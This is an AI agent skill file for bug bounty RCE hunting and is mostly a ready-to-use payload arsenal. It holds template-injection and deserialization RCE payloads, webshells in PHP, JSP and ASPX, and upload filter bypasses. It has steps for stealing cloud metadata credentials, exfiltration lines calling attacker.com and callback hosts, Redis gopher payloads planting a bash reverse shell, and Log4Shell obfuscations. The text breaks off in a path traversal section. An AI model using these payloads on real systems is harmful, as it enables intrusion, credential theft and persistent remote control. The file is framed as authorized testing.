---
name: hunt-rce
description: Complete RCE hunting skill for bug bounty. Use when testing for Remote Code Execution via SSTI, deserialization, file upload, SSRF chains, command injection, code injection, XXE, path traversal, and exposed admin panels. Load when target has template rendering, file upload, URL parameters, or when nuclei finds admin panels.
---

# RCE Hunting Skill

Remote Code Execution is the apex finding in bug bounty. Every vector below has a confirmed bounty trail. PoC or GTFO — `id`/`whoami` output or DNS hit via Interactsh is the minimum confirmation. Never destructive (`rm`, `mkdir`, `shutdown`, fork bombs are banned).

---

## SECTION 1: RECON PHASE — Identifying RCE Surface

### Step 0: Always run nuclei KEV scan first
```bash
nuclei -l live.txt -tags kev,vkev -severity critical,high \
  -interactsh-url https://oast.pro -rate-limit 50 -o nuclei-kev.txt
nuclei -l live.txt -t http/cves/2025/ -severity critical,high -o nuclei-2025.txt
nuclei -l live.txt -t http/cves/2024/ -severity critical,high -o nuclei-2024.txt
nuclei -l live.txt -t http/cves/2023/ -severity critical,high -o nuclei-2023.txt
```

### SSTI candidate discovery
```bash
# Reflected param hunt
gau target.com | gf ssti | qsreplace '{{7*7}}' | httpx -mc 200 -mr "49" -o ssti-jinja.txt
gau target.com | gf ssti | qsreplace '${7*7}' | httpx -mc 200 -mr "49" -o ssti-freemarker.txt
gau target.com | gf ssti | qsreplace '<%= 7*7 %>' | httpx -mc 200 -mr "49" -o ssti-erb.txt

# Polyglot probe — single string flags multiple engines
katana -u https://target.com -d 5 -jc | grep -E '\?.*=' | \
  qsreplace '${{<%[%"}}%\.' | httpx -mc 200,500 -o ssti-polyglot.txt
```

### Deserialization endpoint discovery
```bash
# Java patterns
gau target.com | grep -iE '\.do|\.action|/invoker/|jsessionid' > java-endpoints.txt
# Look for base64 cookies / params starting with rO0AB (Java serialized magic)
gau target.com | qsreplace FUZZ | grep -iE 'token|session|state|data|cookie' > deser-params.txt
# Look for ViewState (ASP.NET)
curl -s https://target.com | grep -oE '__VIEWSTATE[^&]*' 
# Pickle patterns (gAS, gAN base64 prefix)
# Ruby Marshal (BAh base64 prefix)
# PHP serialized (a:N:{ or O:N:")
```

### File upload endpoint discovery
```bash
gau target.com | grep -iE 'upload|avatar|profile|attach|import|file|picture|photo|document' > upload.txt
katana -u https://target.com -fr | grep -iE 'enctype.*multipart' > upload-forms.txt
# Search JS for upload endpoints
gau target.com -mc 200 | grep -E '\.js$' | xargs -I{} curl -s {} | \
  grep -oE '"/(upload|file|attach|import)[^"]*"' | sort -u
```

### SSRF → RCE candidates
```bash
# URL params likely to fetch
gau target.com | gf ssrf > ssrf-candidates.txt
# Common keywords: url, uri, src, dest, redirect, callback, webhook, fetch, image, file, target, return, next, host, path, reference, site, html, val, validate, domain, callback_url, return_url, openid
gau target.com | grep -iE '(url|uri|callback|webhook|fetch|src|dest|host|domain)=' > ssrf-likely.txt
```

### Admin panel discovery
```bash
nuclei -l live.txt -t http/exposed-panels/ -o panels.txt
ffuf -u https://target.com/FUZZ -w ~/wordlists/admin-paths.txt -mc 200,401,403 -o admin.json
# Critical paths to probe individually
for path in /actuator /actuator/env /actuator/heapdump /actuator/gateway/routes \
            /script /scriptText /jenkins /console /manager/html /h2-console \
            /solr /druid/index.html /metrics /debug /api-docs /swagger-ui \
            /graphql /graphiql /wp-admin /administrator /admin /n8n; do
  echo "$path: $(curl -ks -o /dev/null -w '%{http_code}' https://target.com$path)"
done
```

### Tech stack fingerprinting
```bash
whatweb -a 3 https://target.com
wappalyzer-cli https://target.com
nuclei -l live.txt -t http/technologies/ -o tech.txt
# Check for known-vulnerable headers
curl -ksI https://target.com | grep -iE 'server|x-powered-by|x-aspnet-version|x-runtime'
# Favicon hash → tech fingerprint
curl -ks https://target.com/favicon.ico | md5sum
```

---

## SECTION 2: SSTI → RCE

### Detection polyglot (single payload tests all engines)
```
${{<%[%'"}}%\.
```
Different errors / reflections reveal the engine. Then run targeted detection.

### Jinja2 (Python — Flask, Django, Ansible)

**Detect:** `{{7*7}}` → `49`

**Class hierarchy access:**
```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**RCE — primary:**
```jinja
{{ lipsum.__globals__['os'].popen('id').read() }}
```

**RCE — cycler/range fallbacks:**
```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ range.__class__.__base__.__subclasses__()[NNN]("id",shell=True,stdout=-1).communicate() }}
```

**Filter bypass (hex/attr):**
```jinja
{{ ''['__cl'~'ass__']['__mr'~'o__'][1]['__subcl'~'asses__']() }}
{{ ''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1) }}
```

**Blind via timing:**
```jinja
{{ lipsum.__globals__['os'].popen('sleep 10').read() }}
```

**Blind via OOB:**
```jinja
{{ lipsum.__globals__['os'].popen('curl http://<collab>/?$(id|base64)').read() }}
```

### Twig (PHP — Symfony, Drupal 8+)

**Detect:** `{{7*7}}` → `49`

**RCE Twig v1.x:**
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**RCE Twig v2/v3 (filter chain):**
```twig
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['id']|reduce('system')}}
```

**Drupal-specific:**
```twig
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
```

### Freemarker (Java — Confluence, Liferay)

**Detect:** `${7*7}` → `49`

**RCE — primary:**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**RCE — Object Wrapper:**
```freemarker
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${value("java.lang.ProcessBuilder",["id"]).start()}
```

**Sandbox bypass (StaticModel):**
```freemarker
${"freemarker.template.utility.JythonRuntime"?new()("import os;os.system('id')")}
<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classloader.loadClass("freemarker.template.utility.Execute")>
<#assign ex=clazz.newInstance()>${ex("id")}
```

### Velocity (Java — older Confluence)

**Detect:** `#set($x=7*7)$x` → `49`

**Full RCE chain:**
```velocity
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))
#set($process=$runtime.exec("id"))
#set($is=$process.getInputStream())
#set($isr=$stringClass.forName("java.io.InputStreamReader").getDeclaredConstructors()[2].newInstance($is))
#set($br=$stringClass.forName("java.io.BufferedReader").getDeclaredConstructors()[1].newInstance($isr))
$br.readLine()
```

### Pebble (Java — Spring Boot templates)

**RCE:**
```pebble
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}{{ {('java.lang.Runtime'):null}.keySet().toArray()[0].getRuntime().exec(cmd) }}
```

### Mako (Python — Pylons, Pyramid)

**RCE:**
```mako
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Smarty (PHP)

**RCE — older versions:**
```smarty
{system('id')}
{php}system('id');{/php}
{$smarty.template_object->smarty->disableSecurity()->display('string:{system(\'id\')}')}
```

### ERB (Ruby — Rails, older Sinatra)

**RCE:**
```erb
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').readlines() %>
```

### Handlebars (Node.js)

**RCE via constructor chain:**
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}
        {{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Nunjucks (Node.js)

**RCE via range.constructor:**
```nunjucks
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}
```

### Tools
- **sstimap** — `python3 sstimap.py -u 'https://target.com/?name=*' -lP`
- **fenjing** — advanced Jinja2 sandbox bypass: `fenjing crack-request -f req.txt`
- **tplmap** — older but still useful for blind detection

---

## SECTION 3: DESERIALIZATION → RCE

### Java (ysoserial)

**Generate payload:**
```bash
java -jar ysoserial-all.jar CommonsCollections1 "curl http://<collab>/$(id|base64 -w0)" > payload.ser
base64 -w0 payload.ser > payload.b64
```

**Chain priority order (try in this sequence):**
1. `CommonsCollections1`-`7` (most prevalent)
2. `CommonsBeanutils1` / `CommonsBeanutils2` (Java 17+ compatible)
3. `Spring1`, `Spring2`
4. `Groovy1`
5. `ROME`
6. `Hibernate1`, `Hibernate2`
7. `JSON1`, `JBossInterceptors1`
8. `Rhino3` (Java 17+ JDK gadget chain)
9. `Click1`, `MozillaRhino1`
10. `Vaadin1`, `Wicket1`

**URLDNS canary (safe detection first):**
```bash
java -jar ysoserial-all.jar URLDNS "http://<unique-subdomain>.<collab>" > urldns.ser
# Send and watch interactsh for DNS hit — confirms reachable deserialization
```

**Java 17+ chains (when CC* fails):**
```bash
java -jar ysoserial-modified.jar CommonsBeanutils2 "id" > j17.ser
java -jar ysoserial-modified.jar Rhino3 "id" > j17-rhino.ser
```

**Detection signatures:**
- Base64 prefix: `rO0AB` (decodes to `0xAC 0xED 0x00 0x05` — Java magic)
- Hex magic in raw bytes: `\xAC\xED\x00\x05`
- Cookies/params/headers containing serialized data

**Common landing spots:**
- JSF ViewState
- Java RMI `/invoker/JMXInvokerServlet`
- WebSphere SOAP `/wssample/services`
- WebLogic T3 / IIOP / XMLDecoder
- ActiveMQ OpenWire (CVE-2023-46604)

### PHP (phpggc)

**Generate payload:**
```bash
phpggc Monolog/RCE1 system id -b
phpggc Laravel/RCE9 system id -b
phpggc Symfony/RCE4 system id -b
phpggc WordPress/RCE2 system id -b
```

**Common chains:** Monolog, Laravel, Symfony, Yii, WordPress, Magento, Drupal, Doctrine, SwiftMailer, Phalcon, Slim, Guzzle

**PHAR deserialization (`phar://` wrapper):**
```bash
phpggc Monolog/RCE1 system id -p phar -o exploit.phar
# Upload as image.jpg, then trigger via file_exists("phar://uploads/image.jpg")
# Stat-like operations (file_exists, is_file, filemtime, file_get_contents) trigger
```

**Magic methods to grep for in source:**
- `__wakeup()` — invoked on unserialize
- `__destruct()` — invoked when object destroyed
- `__toString()` — invoked when used as string
- `__call()`, `__get()`, `__set()`, `__invoke()`

### Python pickle

**Detection signatures:**
- Base64 prefix: `gASV` (protocol 5), `gAN` (protocol 4), `gAJ` (protocol 2), `gAJ` `gAR` `gAS`
- Raw start: `\x80\x05` (proto 5), `\x80\x04`, `\x80\x02`

**RCE payload:**
```python
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('curl http://<collab>/$(id|base64)',))
payload = base64.b64encode(pickle.dumps(E())).decode()
print(payload)
```

**One-liner:**
```python
python3 -c "import pickle,base64,os;print(base64.b64encode(pickle.dumps(type('',(),{'__reduce__':lambda s:(os.system,('id',))})())))"
```

### YAML (PyYAML unsafe load, SnakeYAML)

**Python PyYAML (`yaml.load` without SafeLoader):**
```yaml
!!python/object/apply:os.system ['id']
!!python/object/apply:subprocess.Popen [['id']]
!!python/object/new:os.system ['curl http://<collab>/']
```

**Java SnakeYAML (CVE-2017-18640):**
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/yaml-payload.jar"]
  ]]
]
```

### Node.js node-serialize (CVE-2017-5941)

**Detection pattern in payload:** `_$$ND_FUNC$$_`

**IIFE payload:**
```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://<collab>/$(id|base64)', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

**Generate:**
```bash
node -e "var y={rce:function(){require('child_process').exec('id')}}; var s=require('node-serialize'); console.log(s.serialize(y).replace('\"rce\":\"','\"rce\":\"_\$\$ND_FUNC\$\$_'));"
```

### .NET (ysoserial.net)

**ViewState RCE (when validationKey leaked, e.g. from Git):**
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell -enc <base64>" \
  --validationalg="SHA1" --validationkey="LEAKED_KEY" \
  --generator="CA0B0334" --islegacy --isdebug
```

**JSON.NET TypeNameHandling RCE:**
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c calc.exe"]
  },
  "ObjectInstance": {"$type": "System.Diagnostics.Process, System"}
}
```

**Common gadgets:** TextFormattingRunProperties, TypeConfuseDelegate, ObjectDataProvider, WindowsIdentity, ResourceSet, ActivitySurrogateSelector, BinaryFormatter, LosFormatter, SoapFormatter, NetDataContractSerializer, XamlReader

**CVE-2025-59287 WSUS (SoapFormatter):**
- CVSS 9.8 — Pre-auth RCE
- Ports 8530 (HTTP) / 8531 (HTTPS)
- Endpoint: `/ClientWebService/Client.asmx`
- Tested via SoapFormatter deserialization payload

### Ruby Marshal

**Detection signatures:**
- Base64 prefix: `BAh` (corresponds to `\x04\x08` Marshal magic)
- Raw start: `\x04\x08`

**Net::WriteAdapter chain (Ruby 2.x/3.x):**
```ruby
require 'net/http'
class Gem::Requirement
  def marshal_dump
    [Gem::DependencyList.new]
  end
end
# Full chain: ruby_marshal_rce_gen.rb from public PoCs (Universal Ruby Deserialization Gadget)
```

**Tool:** [universal_rce_ruby_marshal](https://github.com/GitHubForRicerca/universal_rce_ruby_marshal_gadget)

---

## SECTION 4: FILE UPLOAD → RCE

### Extension bypass — try in this priority order

| # | Technique | Example |
|---|-----------|---------|
| 1 | Case variation | `.pHp` `.PHP5` `.PhTML` `.PHp7` |
| 2 | Double extension | `shell.php.jpg` `shell.jpg.php` |
| 3 | Alternate exec extensions | `.phtml` `.phar` `.pht` `.php5` `.php7` `.phps` `.inc` `.pl` `.cgi` `.jsp` `.jspx` `.jsw` `.jsv` `.aspx` `.asp` `.cer` `.asa` |
| 4 | Null byte (older PHP/Java) | `shell.php%00.jpg` `shell.php\x00.jpg` |
| 5 | Trailing dot/space | `shell.php.` `shell.php ` `shell.php/` |
| 6 | Path traversal in filename | `../../../../var/www/html/shell.php` |
| 7 | .htaccess upload | `AddType application/x-httpd-php .jpg` |
| 8 | web.config upload (IIS) | `<handlers>...<add name=...path="*.jpg" verb="*" .../></handlers>` |
| 9 | Unicode/RTL override | `shell.gpj‮php.` (RLO U+202E) |
| 10 | Long filename truncation | `shell.php.aaaaaaaa...aaaaa.jpg` |

### MIME bypass
Always lie about Content-Type:
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```
Some servers check MIME only — match expected type regardless of file extension.

### Magic bytes bypass
Prepend valid image magic bytes to a webshell:
```bash
# PNG header + PHP
echo -e '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > shell.png.php

# GIF header + PHP
echo -e 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.gif.php

# JPEG header + PHP
echo -e '\xff\xd8\xff\xe0<?php system($_GET["c"]); ?>' > shell.jpg.php
```

### Polyglot files
**GIF + PHP (single file is valid GIF AND valid PHP):**
```
GIF89a/*<?php system($_GET['c']); ?>*/
```

**PHP + JPG polyglot:**
```bash
# Use exiftool to inject PHP into JPG EXIF comment
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

### SVG with embedded payloads

**SVG + XSS:**
```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(document.domain)</script>
</svg>
```

**SVG + XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="20">&xxe;</text>
</svg>
```

**SVG + SSRF (image referencing internal host):**
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" />
</svg>
```

### ImageMagick vulnerabilities

**CVE-2016-3714 ImageTragick:**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|curl http://<collab>/$(id|base64)")'
pop graphic-context
```
Save as `exploit.mvg` or rename to `exploit.jpg`, upload.

**CVE-2024-41817 (AppImage PATH RCE)** — affects ImageMagick AppImage builds when called from web context.

**CVE-2025-57807 (heap OOB)** — recent disclosure, check Magick version with `identify -version`.

### Webshells

**PHP (minimal):**
```php
<?php system($_GET['c']); ?>
<?=`$_GET[0]`?>
<?php eval($_POST['x']); ?>
```

**PHP one-liner via header (more stealth):**
```php
<?php @eval($_SERVER['HTTP_X_C']); ?>
# Trigger: curl -H "X-C: system('id');" https://target.com/shell.php
```

**JSP (full shell):**
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
  String cmd = request.getParameter("c");
  Process p = Runtime.getRuntime().exec(cmd);
  BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while ((line = r.readLine()) != null) out.println(line);
%>
```

**ASPX:**
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
  void Page_Load(object s, EventArgs e) {
    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + Request["c"]);
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
  }
</script>
```

---

## SECTION 5: SSRF → RCE

### AWS IMDSv1 chain (most common path to cloud RCE)

```bash
# Step 1 — enumerate roles
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2 — grab credentials for discovered role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration

# Step 3 — configure local AWS CLI
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>

# Step 4 — confirm identity
aws sts get-caller-identity

# Step 5 — RCE via SSM (if role has ssm:SendCommand)
aws ssm send-command --instance-ids i-XXXXXXX --document-name "AWS-RunShellScript" \
  --parameters 'commands=["id","whoami","hostname"]'

# Other escalation paths:
aws lambda list-functions
aws s3 ls
aws iam list-attached-role-policies --role-name <ROLE>
aws ec2 describe-instances
```

### IMDSv2 bypass techniques

**1. Open redirect chain** — find an open redirect that lands on `http://169.254.169.254/`.

**2. PDF/headless browser PUT** — headless renderers like wkhtmltopdf, Puppeteer with `--no-sandbox`, or Prince can issue PUT requests:
```html
<script>
fetch('http://169.254.169.254/latest/api/token', {
  method: 'PUT',
  headers: {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
}).then(r => r.text()).then(token =>
  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
    headers: {'X-aws-ec2-metadata-token': token}
  }).then(r => r.text()).then(d => fetch('http://attacker.com/?d=' + btoa(d)))
);
</script>
```

**3. SSRF + protocol smuggling** — `gopher://` to craft PUT request manually.

### GCP metadata
```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Also useful:
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true
```

### Azure IMDS
```bash
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Then use token to call Azure REST API:
curl -H "Authorization: Bearer <TOKEN>" \
  https://management.azure.com/subscriptions?api-version=2020-01-01
```

### Redis via Gopher → RCE

**Cron write (Linux):**
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/<attacker>/4444 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**SSH key write:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$<LEN>%0d%0a%0a%0assh-rsa AAAA...%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**Tool:** [Gopherus](https://github.com/tarunkant/Gopherus) — `gopherus --exploit redis`

### SSRF filter bypasses

| Type | Payload examples |
|------|------------------|
| Decimal IP | `http://2130706433/` (= 127.0.0.1) |
| Hex IP | `http://0x7f000001/` `http://0x7f.0x0.0x0.0x1/` |
| Octal IP | `http://017700000001/` `http://0177.0.0.1/` |
| IPv6 mapped | `http://[::ffff:127.0.0.1]/` `http://[::1]/` |
| Mixed | `http://127.1/` `http://127.0.1/` |
| URL parser confusion | `http://expected.com#@169.254.169.254/` `http://expected.com@169.254.169.254/` `http://expected.com\@169.254.169.254/` |
| DNS rebinding | `http://7f000001.<rebinder>/` (use rbndr.us or dnschef) |
| Redirect chain | Host an open redirect → `http://attacker.com/redir?to=http://169.254.169.254/` |
| Protocol smuggling | `gopher://` `dict://` `file://` `ldap://` `ftp://` `tftp://` |
| Wildcard DNS | `http://169.254.169.254.nip.io/` `http://localtest.me/` |

### Blind SSRF confirmation
- **Interactsh** — `interactsh-client` (self-hostable, OAST best-of-breed)
- **canarytokens.org** — quick DNS canaries
- **webhook.site** — HTTP request inspection
- **Burp Collaborator** — gold standard if you have Pro

---

## SECTION 6: COMMAND INJECTION

### Detection probes (concat into existing fields)
```
test;id
test|id
test`id`
test$(id)
test&&id
test||id
test%0aid     (newline)
test%0did     (CR)
test'id'
test"id"
```

### Blind OOB confirmation
```
||nslookup `whoami`.<collab>||
||curl http://<collab>/$(whoami)||
;curl http://<collab>/$(id|base64)
$(curl http://<collab>/$(id|base64))
`curl http://<collab>/$(id|base64)`
```

### Time-based
```
test;sleep 10
test||ping -c 10 127.0.0.1||
test && timeout 10
```

### Filter / WAF bypasses

| Filter | Bypass |
|--------|--------|
| Space blocked | `${IFS}` `$IFS$9` `{cat,/etc/passwd}` `</etc/passwd` `<<<$(id)` |
| Slash blocked | `${PATH:0:1}` `${HOME:0:1}` `$(echo -e \\\\x2f)` |
| Quote-stripped | `c''at` `c\at` `'c'at` `"c"at` `c$@at` |
| Keyword filter | `c'a't /etc/passwd` `c\at /etc/passwd` `/?in/c?t /etc/passwd` |
| Wildcard | `/???/c??` (matches `/bin/cat`) `/???/??t /???/p??s??` |
| Hex encoding | `$(printf '\x69\x64')` |
| Base64 decode | `bash -c $(echo aWQ=\|base64\ -d)` |
| Reversed string | `$(rev<<<'di')` |
| Tab as separator | `cat${IFS}/etc/passwd` |

### Context-specific RCE per language

**Node.js (child_process, exec, spawn):**
```
;require('child_process').execSync('id')
'-require('child_process').execSync('id')-'
${require('child_process').execSync('id')}
```

**Python (os.system, subprocess, eval):**
```
__import__('os').system('id')
__import__('subprocess').check_output(['id'])
```

**PHP (system, exec, shell_exec, passthru, backtick):**
```
;system('id');
|system('id')|
`id`
$(id)
```

**Ruby (system, exec, backtick, %x, eval):**
```
;system('id')
%x(id)
`id`
eval("`id`")
```

**Java (Runtime.exec, ProcessBuilder):**
- Usually requires code injection (OGNL, Spring EL) — see Section 7.

### Tool: commix
```bash
commix -u "https://target.com/page?cmd=test" --batch
commix --url="https://target.com/api" --data="cmd=test" --batch --random-agent
```

---

## SECTION 7: CODE INJECTION

### Python eval
```python
__import__('os').system('id')
__import__('os').popen('id').read()
().__class__.__bases__[0].__subclasses__()[NNN]('id',shell=True,stdout=-1).communicate()
exec("import os;os.system('id')")
```

### PHP eval (PHPUnit CVE-2017-9841)
```bash
curl 'https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' \
  --data "<?php system('id');"
```

### Node.js Function constructor / eval
```javascript
Function("return require('child_process').execSync('id')")()
this.constructor.constructor("return process.mainModule.require('child_process').execSync('id')")()
eval("require('child_process').execSync('id')")
```

### Ruby eval
```ruby
eval("`id`")
eval("system('id')")
Kernel.eval("`id`")
```

### Spring EL injection
```
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Runtime).getRuntime().exec(new String[]{"sh","-c","curl http://<collab>/$(id|base64)"})}
#{T(java.lang.Runtime).getRuntime().exec('id')}
```

### OGNL injection (Struts, Confluence)
```
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@java.lang.Runtime@getRuntime().exec('id'))}

# Shorter:
@java.lang.Runtime@getRuntime().exec('id')
```

### Log4Shell (CVE-2021-44228) — still active in legacy

**Test in every HTTP header:**
```
User-Agent: ${jndi:ldap://<collab>/a}
X-Forwarded-For: ${jndi:ldap://<collab>/a}
X-Api-Version: ${jndi:ldap://<collab>/a}
Referer: ${jndi:ldap://<collab>/a}
X-Forwarded-Host: ${jndi:ldap://<collab>/a}
X-Forwarded-Proto: ${jndi:ldap://<collab>/a}
True-Client-IP: ${jndi:ldap://<collab>/a}
```

**JNDI obfuscation bypasses:**
```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://<collab>/a}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://<collab>/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//<collab>/a}
${${::-${::-$${::-j}}}ndi:ldap://<collab>/a}
${jndi:${lower:l}${lower:d}a${lower:p}://<collab>/a}
${jndi:dns://<collab>/a}
${jndi:rmi://<collab>/a}
```

**Tool:** [marshalsec](https://github.com/mbechler/marshalsec)
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8000/#Exploit"
```

**Java 17+ JNDI bypass (BeanFactory):**
- Modern JDKs disable LDAP class loading by default.
- Bypass via `org.apache.naming.factory.BeanFactory` referencing Tomcat classes.

---

## SECTION 8: XXE → RCE

### Detection probe
```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://<collab>/dtd">
<foo>bar</foo>
```
Watch interactsh for DNS hit — confirms XML parsing of external DTDs.

### Inline file read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Windows -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
```

### OOB exfil via external DTD

**Host on attacker.com/evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<collab>/?d=%file;'>">
%eval;
%exfil;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo>bar</foo>
```

### Error-based blind XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```
File contents appear in the parser error message.

### PHP filter wrapper (base64 to bypass binary issues)
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">
```

### XXE in non-XML file formats

**SVG (re-uploaded as image):**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg><text>&xxe;</text></svg>
```

**DOCX/XLSX (XML inside ZIP):**
- Unzip the document
- Modify `word/document.xml` (DOCX) or `xl/workbook.xml` (XLSX) with XXE
- Re-zip
- Upload to a docx/xlsx parser endpoint

**SAML, RSS, SOAP** — all XML-based, all candidates.

### XXE → SSRF → IMDS chain
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

### XXE filter bypasses

| Filter | Bypass |
|--------|--------|
| External entity blocked | Use parameter entities (`%xxe`) |
| `<!DOCTYPE` blocked | UTF-7, UTF-16 encoding |
| `SYSTEM` blocked | `PUBLIC` keyword: `<!ENTITY xxe PUBLIC "x" "file:///etc/passwd">` |
| URL filter | Use `jar:` `netdoc:` `expect:` protocols |
| Allowlist domains | Open redirect on allowed domain |

---

## SECTION 9: PATH TRAVERSAL → RCE

### Detection
```
../../../../etc/passwd
../../../../etc/passwd%00
....//....//....//etc/passwd
